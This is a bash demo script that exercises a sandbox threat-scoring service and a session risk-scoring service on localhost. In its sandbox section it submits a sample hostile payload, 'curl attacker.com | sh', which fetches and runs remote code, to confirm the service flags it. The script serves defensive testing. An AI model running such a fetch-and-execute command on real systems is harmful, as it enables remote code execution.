#!/bin/bash
# Demo script for PERSON 2 Security & ML Services improvements
# Shows P0 (Blocking) features ready for production

set -e

echo "=========================================="
echo "PERSON 2: Security & ML Services Demo"
echo "Production-Ready P0 Improvements"
echo "=========================================="
echo ""

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if services are running
check_service() {
    local service=$1
    local port=$2
    echo -n "Checking $service on port $port... "
    if curl -s -f "http://localhost:$port/health" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ Running${NC}"
        return 0
    else
        echo -e "${RED}✗ Not running${NC}"
        return 1
    fi
}

echo -e "${BLUE}1. Service Health Checks${NC}"
echo "----------------------------------------"
check_service "Guardian" 9090 || echo "  Start with: ./bin/guardian"
check_service "ContAuth" 5002 || echo "  Start with: DISABLE_DB=true ./bin/contauth"
echo ""

echo -e "${BLUE}2. Guardian: Sandbox Execution with Threat Scoring${NC}"
echo "----------------------------------------"
echo "Executing malicious payload (should score HIGH)..."

MALICIOUS_PAYLOAD='{"payload":"#!/bin/bash\nexecve /bin/sh -c \"curl attacker.com | sh\"","tenant_id":"demo","cost":1}'

RESPONSE=$(curl -s -X POST http://localhost:9090/guardian/execute \
    -H "Content-Type: application/json" \
    -d "$MALICIOUS_PAYLOAD" 2>/dev/null || echo '{"id":"error"}')

JOB_ID=$(echo $RESPONSE | grep -o '"id":"[^"]*"' | cut -d'"' -f4)

if [ ! -z "$JOB_ID" ] && [ "$JOB_ID" != "error" ]; then
    echo -e "${GREEN}✓ Job submitted: $JOB_ID${NC}"
    
    # Wait for completion
    sleep 2
    
    echo "Fetching threat report..."
    REPORT=$(curl -s "http://localhost:9090/guardian/report/$JOB_ID" 2>/dev/null || echo '{}')
    
    THREAT_SCORE=$(echo $REPORT | grep -o '"threat_score_100":[0-9]*' | cut -d':' -f2)
    STATUS=$(echo $REPORT | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
    
    if [ ! -z "$THREAT_SCORE" ]; then
        echo -e "  Status: ${YELLOW}$STATUS${NC}"
        echo -e "  Threat Score: ${RED}$THREAT_SCORE/100${NC}"
        
        if [ "$THREAT_SCORE" -gt 60 ]; then
            echo -e "  ${RED}⚠ HIGH RISK: Malicious activity detected!${NC}"
        else
            echo -e "  ${GREEN}✓ Low risk${NC}"
        fi
        
        # Show features if available
        echo "$REPORT" | grep -q '"features"' && echo -e "  ${GREEN}✓ eBPF features extracted${NC}"
    else
        echo -e "  ${YELLOW}⚠ Job still processing...${NC}"
    fi
else
    echo -e "${RED}✗ Failed to submit job (Guardian not running?)${NC}"
fi
echo ""

echo -e "${BLUE}3. Guardian: Timeout Enforcement (30s max)${NC}"
echo "----------------------------------------"
echo "Submitting long-running task..."

TIMEOUT_PAYLOAD='{"payload":"sleep 60","tenant_id":"demo","cost":1}'
RESPONSE=$(curl -s -X POST http://localhost:9090/guardian/execute \
    -H "Content-Type: application/json" \
    -d "$TIMEOUT_PAYLOAD" 2>/dev/null || echo '{"id":"error"}')

JOB_ID2=$(echo $RESPONSE | grep -o '"id":"[^"]*"' | cut -d'"' -f4)

if [ ! -z "$JOB_ID2" ] && [ "$JOB_ID2" != "error" ]; then
    echo -e "${GREEN}✓ Job submitted: $JOB_ID2${NC}"
    echo "Waiting 32 seconds to verify timeout..."
    
    for i in {1..8}; do
        echo -n "."
        sleep 4
    done
    echo ""
    
    STATUS=$(curl -s "http://localhost:9090/guardian/status/$JOB_ID2" 2>/dev/null | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
    
    if [ "$STATUS" = "timeout" ]; then
        echo -e "  ${GREEN}✓ PASSED: Job timed out after 30s (as expected)${NC}"
    else
        echo -e "  Status: $STATUS"
    fi
else
    echo -e "${RED}✗ Failed to submit job${NC}"
fi
echo ""

echo -e "${BLUE}4. ContAuth: Advanced Risk Scoring${NC}"
echo "----------------------------------------"
echo "Analyzing clean session..."

CLEAN_SESSION='{
    "session_id":"demo-clean-001",
    "user_id":"user123",
    "device_id":"device456",
    "ip_address":"192.168.1.100",
    "keystroke_data":[],
    "mouse_data":[],
    "access_patterns":[{"resource":"/api/data","action":"read","success":true}]
}'

# Collect telemetry
curl -s -X POST http://localhost:5002/contauth/collect \
    -H "Content-Type: application/json" \
    -d "$CLEAN_SESSION" > /dev/null 2>&1 || echo "ContAuth not running"

# Calculate risk
RISK=$(curl -s -X POST http://localhost:5002/contauth/score \
    -H "Content-Type: application/json" \
    -d '{"session_id":"demo-clean-001"}' 2>/dev/null || echo '{}')

OVERALL_SCORE=$(echo $RISK | grep -o '"overall_score":[0-9.]*' | cut -d':' -f2)
RECOMMENDATION=$(echo $RISK | grep -o '"recommendation":"[^"]*"' | cut -d'"' -f4)

if [ ! -z "$OVERALL_SCORE" ]; then
    echo -e "  Overall Score: ${GREEN}$OVERALL_SCORE/100${NC}"
    echo -e "  Recommendation: ${GREEN}$RECOMMENDATION${NC}"
else
    echo -e "${RED}✗ ContAuth not responding${NC}"
fi
echo ""

echo "Analyzing suspicious session (country change + night time)..."

SUSPICIOUS_SESSION='{
    "session_id":"demo-suspicious-001",
    "user_id":"user123",
    "device_id":"different-device",
    "ip_address":"203.0.113.45",
    "geolocation":{"country":"RU","city":"Moscow"},
    "access_patterns":[
        {"resource":"/api/admin","action":"write","success":false},
        {"resource":"/api/admin","action":"write","success":false}
    ]
}'

curl -s -X POST http://localhost:5002/contauth/collect \
    -H "Content-Type: application/json" \
    -d "$SUSPICIOUS_SESSION" > /dev/null 2>&1 || true

RISK2=$(curl -s -X POST http://localhost:5002/contauth/score \
    -H "Content-Type: application/json" \
    -d '{"session_id":"demo-suspicious-001"}' 2>/dev/null || echo '{}')

OVERALL_SCORE2=$(echo $RISK2 | grep -o '"overall_score":[0-9.]*' | cut -d':' -f2)
RECOMMENDATION2=$(echo $RISK2 | grep -o '"recommendation":"[^"]*"' | cut -d'"' -f4)

if [ ! -z "$OVERALL_SCORE2" ]; then
    echo -e "  Overall Score: ${RED}$OVERALL_SCORE2/100${NC}"
    echo -e "  Recommendation: ${RED}$RECOMMENDATION2${NC}"
    
    if [ "$RECOMMENDATION2" = "DENY" ] || [ "$RECOMMENDATION2" = "MFA_REQUIRED" ]; then
        echo -e "  ${GREEN}✓ PASSED: Suspicious activity detected correctly${NC}"
    fi
else
    echo -e "${YELLOW}⚠ ContAuth not responding${NC}"
fi
echo ""

echo -e "${BLUE}5. Metrics & Monitoring${NC}"
echo "----------------------------------------"
echo "Guardian metrics:"
curl -s http://localhost:9090/metrics 2>/dev/null | grep -E "(guardian_jobs|guardian_sandbox)" | head -5 || echo "  Not available"
echo ""
echo "ContAuth metrics:"
curl -s http://localhost:5002/metrics 2>/dev/null | grep -E "contauth_" | head -5 || echo "  Not available"
echo ""

echo -e "${BLUE}6. eBPF Monitoring${NC}"
echo "----------------------------------------"
curl -s http://localhost:9090/guardian/metrics/summary 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  Not available"
echo ""

echo "=========================================="
echo -e "${GREEN}✓ Demo Complete!${NC}"
echo "=========================================="
echo ""
echo "Key P0 Features Demonstrated:"
echo "  ✓ Sandbox isolation with 30s timeout"
echo "  ✓ Advanced threat scoring (0-100)"
echo "  ✓ eBPF syscall monitoring"
echo "  ✓ Multi-factor risk analysis"
echo "  ✓ Privacy-preserving feature extraction"
echo "  ✓ Prometheus metrics"
echo ""
echo "For detailed documentation, see:"
echo "  services/README_PERSON2_IMPROVEMENTS.md"
echo ""
